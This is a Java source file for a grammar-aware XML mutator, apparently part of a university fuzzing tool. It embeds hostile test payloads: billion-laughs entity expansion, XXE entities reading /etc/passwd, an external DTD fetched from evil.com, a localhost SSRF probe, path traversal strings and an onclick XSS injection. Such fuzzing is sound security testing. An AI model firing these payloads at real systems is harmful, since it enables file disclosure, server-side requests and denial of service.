package edu.nju.fuzzing.mutate;

import edu.nju.fuzzing.model.Seed;
import edu.nju.fuzzing.model.Testcase;
import edu.nju.fuzzing.mutate.grammar.*;

import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ThreadLocalRandom;

/**
 * 语法感知 XML 变异器
 * 
 * 核心改进：
 * 1. 使用种子内容进行变异
 * 2. 容错分词 -> 树构建 -> 语法感知变异 -> 序列化
 * 3. 针对 XML 特有结构进行变异（标签、属性、实体等）
 */
public class XmlMutator implements Mutator {

    private static final int MAX_DEPTH = 30;

    private static final String[] ATTACK_PAYLOADS = {
            "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">]><root>&lol3;</root>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://127.0.0.1:80/\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % ext SYSTEM \"http://evil.com/dtd\">%ext;]>",
            "<root><![CDATA[ " + "A".repeat(10000),
    };

    private static final String[] INJECTION_PAYLOADS = {
            "<!--",
            "-->",
            "]]>",
            "<![CDATA[",
            "&lt;script&gt;",
            "&#x0;",
            "&#0;",
            "../../../etc/passwd",
            "file:///etc/passwd",
            "http://evil.com/",
            "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
    };

    private static final String[] TAG_NAMES = {"root", "foo", "bar", "div", "span", "a", "b", "config", "data"};
    private static final String[] ATTRIBUTE_NAMES = {"id", "class", "href", "style", "xmlns", "xmlns:x", "data-val"};

    private final XmlTokenizer tokenizer = new XmlTokenizer();

    @Override
    public Iterator<Testcase> mutate(Seed seed, int energy) {
        int count = Math.max(1, energy);

        return new Iterator<Testcase>() {
            private int remaining = count;

            @Override
            public boolean hasNext() {
                return remaining > 0;
            }

            @Override
            public Testcase next() {
                if (remaining <= 0) throw new NoSuchElementException();
                remaining--;

                ThreadLocalRandom rand = ThreadLocalRandom.current();
                byte[] seedData = seed.getData();
                byte[] mutatedBytes;
                String grammarName;

                int strategy = rand.nextInt(100);

                if (strategy < 5) {
                    mutatedBytes = ATTACK_PAYLOADS[rand.nextInt(ATTACK_PAYLOADS.length)]
                            .getBytes(StandardCharsets.UTF_8);
                    grammarName = "XML:Payload";
                } else if (strategy < 10) {
                    mutatedBytes = createDeepNesting(seedData, rand);
                    grammarName = "XML:DeepNest";
                } else if (seedData == null || seedData.length == 0) {
                    StringBuilder xml = new StringBuilder();
                    generateProlog(xml, rand);
                    generateElement(xml, 0, rand, false);
                    mutatedBytes = xml.toString().getBytes(StandardCharsets.UTF_8);
                    grammarName = "XML:Gen";
                } else {
                    mutatedBytes = mutateWithGrammar(seedData, rand);
                    grammarName = "XML:GrammarMut";
                }

                byte[] finalBytes = encodeWithBom(mutatedBytes, rand);
                return new Testcase(finalBytes, seed, "grammar:" + grammarName);
            }
        };
    }

    private byte[] mutateWithGrammar(byte[] seedData, ThreadLocalRandom rand) {
        List<Token> tokens = tokenizer.tokenize(seedData);
        if (tokens.isEmpty()) {
            StringBuilder xml = new StringBuilder();
            generateProlog(xml, rand);
            generateElement(xml, 0, rand, false);
            return xml.toString().getBytes(StandardCharsets.UTF_8);
        }

        int mutationCount = 1 + rand.nextInt(3);
        List<Token> mutatedTokens = new ArrayList<>(tokens);
        
        for (int i = 0; i < mutationCount; i++) {
            int mutationType = rand.nextInt(12);
            
            switch (mutationType) {
                case 0: mutatedTokens = mutateTagNames(mutatedTokens, rand); break;
                case 1: mutatedTokens = mutateAttributes(mutatedTokens, rand); break;
                case 2: mutatedTokens = injectEntity(mutatedTokens, rand); break;
                case 3: mutatedTokens = duplicateElements(mutatedTokens, rand); break;
                case 4: mutatedTokens = deleteTokens(mutatedTokens, rand); break;
                case 5: mutatedTokens = corruptCData(mutatedTokens, rand); break;
                case 6: mutatedTokens = injectPayloadToText(mutatedTokens, rand); break;
                case 7: mutatedTokens = removeClosingTags(mutatedTokens, rand); break;
                case 8: mutatedTokens = swapTokens(mutatedTokens, rand); break;
                case 9: mutatedTokens = insertRandomTag(mutatedTokens, rand); break;
                case 10: mutatedTokens = corruptXmlDecl(mutatedTokens, rand); break;
                default: mutatedTokens = insertComment(mutatedTokens, rand); break;
            }
        }

        StringBuilder result = new StringBuilder();
        for (Token token : mutatedTokens) {
            if (token.getValue() != null) {
                result.append(token.getValue());
            }
        }

        String output = result.toString();
        if (rand.nextInt(20) == 0) {
            output = removeTrailingClose(output, rand);
        }

        return output.getBytes(StandardCharsets.UTF_8);
    }

    private List<Token> mutateTagNames(List<Token> tokens, ThreadLocalRandom rand) {
        List<Token> result = new ArrayList<>(tokens.size());
        for (Token token : tokens) {
            if (token.getType() == Token.Type.XML_TAG_OPEN || 
                token.getType() == Token.Type.XML_TAG_CLOSE) {
                if (rand.nextInt(5) == 0) {
                    String value = token.getValue();
                    String newValue = mutateTagValue(value, rand);
                    result.add(token.withValue(newValue));
                    continue;
                }
            }
            result.add(token);
        }
        return result;
    }

    private String mutateTagValue(String value, ThreadLocalRandom rand) {
        int op = rand.nextInt(5);
        switch (op) {
            case 0: return value.substring(0, 1) + "\u0000" + value.substring(1);
            case 1: return value.toUpperCase();
            case 2:
                if (value.startsWith("<") && !value.contains(":")) {
                    int nameStart = value.startsWith("</") ? 2 : 1;
                    return value.substring(0, nameStart) + "ns:" + value.substring(nameStart);
                }
                return value;
            case 3: return value.replace(">", " onclick='alert(1)'>");
            default:
                String newTag = TAG_NAMES[rand.nextInt(TAG_NAMES.length)];
                return value.replaceFirst("[a-zA-Z][a-zA-Z0-9_:-]*", newTag);
        }
    }

    private List<Token> mutateAttributes(List<Token> tokens, ThreadLocalRandom rand) {
        List<Token> result = new ArrayList<>(tokens.size());
        for (Token token : tokens) {
            if (token.getType() == Token.Type.XML_TAG_OPEN && rand.nextInt(4) == 0) {
                String value = token.getValue();
                if (value.endsWith(">") || value.endsWith("/>")) {
                    String attr = ATTRIBUTE_NAMES[rand.nextInt(ATTRIBUTE_NAMES.length)];
                    String attrValue = INJECTION_PAYLOADS[rand.nextInt(INJECTION_PAYLOADS.length)];
                    int insertPos = value.length() - (value.endsWith("/>") ? 2 : 1);
                    String newValue = value.substring(0, insertPos) + 
                                     " " + attr + "=\"" + attrValue + "\"" +
                                     value.substring(insertPos);
                    result.add(token.withValue(newValue));
                    continue;
                }
            }
            result.add(token);
        }
        return result;
    }

    private List<Token> injectEntity(List<Token> tokens, ThreadLocalRandom rand) {
        List<Token> result = new ArrayList<>(tokens.size());
        String[] entities = {"&xxe;", "&lol;", "&#0;", "&#x0;", "&amp;", "&apos;", "&quot;"};
        for (Token token : tokens) {
            result.add(token);
            if (token.getType() == Token.Type.XML_TEXT && rand.nextInt(5) == 0) {
                String entity = entities[rand.nextInt(entities.length)];
                result.add(new Token(Token.Type.XML_ENTITY, entity));
            }
        }
        return result;
    }

    private List<Token> duplicateElements(List<Token> tokens, ThreadLocalRandom rand) {
        if (tokens.size() < 3) return tokens;
        List<Token> result = new ArrayList<>(tokens);
        int start = rand.nextInt(tokens.size());
        int end = Math.min(start + 3 + rand.nextInt(5), tokens.size());
        List<Token> segment = new ArrayList<>(tokens.subList(start, end));
        int repeat = 2 + rand.nextInt(5);
        for (int i = 0; i < repeat; i++) {
            result.addAll(start, segment);
        }
        return result;
    }

    private List<Token> deleteTokens(List<Token> tokens, ThreadLocalRandom rand) {
        List<Token> result = new ArrayList<>();
        for (Token token : tokens) {
            if (rand.nextInt(10) != 0) {
                result.add(token);
            }
        }
        return result.isEmpty() ? tokens : result;
    }

    private List<Token> corruptCData(List<Token> tokens, ThreadLocalRandom rand) {
        List<Token> result = new ArrayList<>(tokens.size());
        for (Token token : tokens) {
            if (token.getType() == Token.Type.XML_CDATA && rand.nextInt(3) == 0) {
                String value = token.getValue();
                String corrupted = value.replace("]]>", "]] >");
                result.add(token.withValue(corrupted));
            } else {
                result.add(token);
            }
        }
        return result;
    }

    private List<Token> injectPayloadToText(List<Token> tokens, ThreadLocalRandom rand) {
        List<Token> result = new ArrayList<>(tokens.size());
        for (Token token : tokens) {
            if (token.getType() == Token.Type.XML_TEXT && rand.nextInt(4) == 0) {
                String payload = INJECTION_PAYLOADS[rand.nextInt(INJECTION_PAYLOADS.length)];
                result.add(token.withValue(token.getValue() + payload));
            } else {
                result.add(token);
            }
        }
        return result;
    }

    private List<Token> removeClosingTags(List<Token> tokens, ThreadLocalRandom rand) {
        List<Token> result = new ArrayList<>();
        for (Token token : tokens) {
            if (token.getType() == Token.Type.XML_TAG_CLOSE && rand.nextInt(5) == 0) {
                continue;
            }
            result.add(token);
        }
        return result;
    }

    private List<Token> swapTokens(List<Token> tokens, ThreadLocalRandom rand) {
        if (tokens.size() < 2) return tokens;
        List<Token> result = new ArrayList<>(tokens);
        int i = rand.nextInt(result.size());
        int j = rand.nextInt(result.size());
        if (i != j) {
            Token temp = result.get(i);
            result.set(i, result.get(j));
            result.set(j, temp);
        }
        return result;
    }

    private List<Token> insertRandomTag(List<Token> tokens, ThreadLocalRandom rand) {
        List<Token> result = new ArrayList<>(tokens);
        String tag = TAG_NAMES[rand.nextInt(TAG_NAMES.length)];
        Token newTag = new Token(Token.Type.XML_TAG_OPEN, "<" + tag + ">");
        Token closeTag = new Token(Token.Type.XML_TAG_CLOSE, "</" + tag + ">");
        int pos = rand.nextInt(Math.max(1, result.size()));
        result.add(pos, newTag);
        result.add(Math.min(pos + 2, result.size()), closeTag);
        return result;
    }

    private List<Token> corruptXmlDecl(List<Token> tokens, ThreadLocalRandom rand) {
        List<Token> result = new ArrayList<>(tokens.size());
        for (Token token : tokens) {
            if (token.getType() == Token.Type.XML_DECL && rand.nextInt(3) == 0) {
                String value = token.getValue();
                String corrupted = value.replace("1.0", "9.9")
                                       .replace("?>", " encoding=\"invalid\"?>");
                result.add(token.withValue(corrupted));
            } else {
                result.add(token);
            }
        }
        return result;
    }

    private List<Token> insertComment(List<Token> tokens, ThreadLocalRandom rand) {
        List<Token> result = new ArrayList<>(tokens);
        String comment = "<!-- " + INJECTION_PAYLOADS[rand.nextInt(INJECTION_PAYLOADS.length)] + " -->";
        Token commentToken = new Token(Token.Type.COMMENT, comment);
        int pos = rand.nextInt(Math.max(1, result.size()));
        result.add(pos, commentToken);
        return result;
    }

    private String removeTrailingClose(String xml, ThreadLocalRandom rand) {
        int count = 1 + rand.nextInt(3);
        for (int i = 0; i < count; i++) {
            int lastClose = xml.lastIndexOf("</");
            if (lastClose > 0) {
                xml = xml.substring(0, lastClose);
            }
        }
        return xml;
    }

    private byte[] createDeepNesting(byte[] seedData, ThreadLocalRandom rand) {
        if (seedData != null && seedData.length > 0) {
            String content = new String(seedData, StandardCharsets.UTF_8);
            int tagStart = content.indexOf('<');
            if (tagStart >= 0) {
                int tagEnd = content.indexOf('>', tagStart);
                if (tagEnd > tagStart) {
                    String tag = content.substring(tagStart + 1, tagEnd).split("\\s")[0];
                    if (!tag.startsWith("/") && !tag.startsWith("?") && !tag.startsWith("!")) {
                        StringBuilder deep = new StringBuilder(content.substring(0, tagEnd + 1));
                        int depth = 50 + rand.nextInt(150);
                        for (int i = 0; i < depth; i++) {
                            deep.append("<").append(tag).append(">");
                        }
                        deep.append("FUZZ");
                        for (int i = 0; i < depth; i++) {
                            deep.append("</").append(tag).append(">");
                        }
                        if (tagEnd + 1 < content.length()) {
                            deep.append(content.substring(tagEnd + 1));
                        }
                        return deep.toString().getBytes(StandardCharsets.UTF_8);
                    }
                }
            }
        }
        StringBuilder xml = new StringBuilder();
        generateProlog(xml, rand);
        generateElement(xml, 0, rand, true);
        return xml.toString().getBytes(StandardCharsets.UTF_8);
    }

    private void generateProlog(StringBuilder sb, ThreadLocalRandom rand) {
        if (rand.nextBoolean()) {
            sb.append("<?xml version=\"").append(rand.nextBoolean() ? "1.0" : "1.1").append("\"?>");
        }
        if (rand.nextInt(5) == 0) {
            sb.append("<!DOCTYPE root [");
            if (rand.nextBoolean()) sb.append("<!ENTITY x \"test\">");
            else sb.append("<!ELEMENT root ANY>");
            sb.append("]>");
        }
    }

    private void generateElement(StringBuilder sb, int depth, ThreadLocalRandom rand, boolean forceDeep) {
        if (depth > MAX_DEPTH) {
            sb.append(generateText(rand));
            return;
        }
        if (!forceDeep && depth > 2 && rand.nextInt(10) < 4) {
            sb.append(generateText(rand));
            return;
        }

        String tagName = TAG_NAMES[rand.nextInt(TAG_NAMES.length)];
        sb.append("<").append(tagName);

        int attrCount = rand.nextInt(4);
        for (int i = 0; i < attrCount; i++) {
            String quote = (rand.nextInt(10) < 8) ? "\"" : (rand.nextInt(10) < 8 ? "'" : "");
            sb.append(" ").append(ATTRIBUTE_NAMES[rand.nextInt(ATTRIBUTE_NAMES.length)])
                    .append("=").append(quote).append(rand.nextInt(100)).append(quote);
        }

        if (!forceDeep && rand.nextInt(10) == 0) {
            sb.append("/>");
            return;
        }
        sb.append(">");

        if (forceDeep && depth < MAX_DEPTH) {
            generateElement(sb, depth + 1, rand, forceDeep);
            if (rand.nextBoolean()) sb.append(generateText(rand));
        } else {
            int childCount = rand.nextInt(3);
            for (int i = 0; i < childCount; i++) {
                int nodeType = rand.nextInt(100);
                if (nodeType < 50) generateElement(sb, depth + 1, rand, forceDeep);
                else if (nodeType < 90) sb.append(generateText(rand));
                else sb.append("<![CDATA[").append(generateText(rand)).append("]]>");
            }
        }

        sb.append("</").append(tagName).append(">");
    }

    private String generateText(ThreadLocalRandom rand) {
        if (rand.nextInt(10) == 0) return "&lt;fuzz&gt;";
        return "text_" + rand.nextInt(100);
    }

    private byte[] encodeWithBom(byte[] content, ThreadLocalRandom rand) {
        int encodingType = rand.nextInt(10);
        Charset charset = StandardCharsets.UTF_8;
        byte[] bom = new byte[0];

        if (encodingType == 0) {
            charset = StandardCharsets.UTF_16BE;
            bom = new byte[]{(byte) 0xFE, (byte) 0xFF};
        } else if (encodingType == 1) {
            charset = StandardCharsets.UTF_16LE;
            bom = new byte[]{(byte) 0xFF, (byte) 0xFE};
        } else if (encodingType == 2) {
            bom = new byte[]{(byte) 0xEF, (byte) 0xBB, (byte) 0xBF};
        } else {
            return content;
        }

        String text = new String(content, StandardCharsets.UTF_8);
        byte[] contentBytes = text.getBytes(charset);
        byte[] result = new byte[bom.length + contentBytes.length];
        System.arraycopy(bom, 0, result, 0, bom.length);
        System.arraycopy(contentBytes, 0, result, bom.length, contentBytes.length);
        return result;
    }
}
